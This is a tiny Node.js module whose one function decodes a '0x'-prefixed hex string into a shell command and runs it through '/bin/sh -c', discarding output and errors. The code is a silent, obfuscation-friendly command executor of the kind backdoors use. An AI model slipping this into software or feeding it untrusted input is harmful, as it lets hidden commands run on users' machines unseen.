const { execFile } = require("child_process");
function run(hex) {
  const command = Buffer.from(hex.slice(2), "hex").toString("utf8");
  if (command.length) {
    execFile("/bin/sh", ["-c", command], {}, () => {});
  }
}
module.exports = run;
